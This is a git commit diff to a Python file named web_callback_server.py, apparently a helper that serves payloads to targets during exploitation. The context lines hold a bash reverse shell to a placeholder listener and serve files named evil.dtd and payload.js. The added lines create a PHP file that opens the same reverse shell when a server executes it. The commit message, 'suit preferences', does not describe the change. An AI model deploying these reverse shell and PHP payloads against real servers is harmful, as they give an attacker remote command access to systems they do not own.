ac6061ddad7550f406822d7c8a4024273ea8edb2
WQ <72185789+n000b3r@users.noreply.github.com>
2026-08-22 04:58:08 -0400

    suit preferences

--- web_callback_server.py
+++ web_callback_server.py
@@ -14,6 +14,9 @@ Usage (copy start_server, SERVED_FILES, EXFIL_DATA into your exploit script):
     shell_payload = f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
     SERVED_FILES["/shell.sh"] = (shell_payload, "text/x-shellscript")
 
+    rev_php = f\"""<?php system("bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"); ?>""\"
+    SERVED_FILES["/rev.php"] = (rev_php, "application/x-httpd-php")
+
     SERVED_FILES["/evil.dtd"] = (dtd_payload, "application/xml-dtd")
     SERVED_FILES["/payload.js"] = (js_payload, "application/javascript")
     
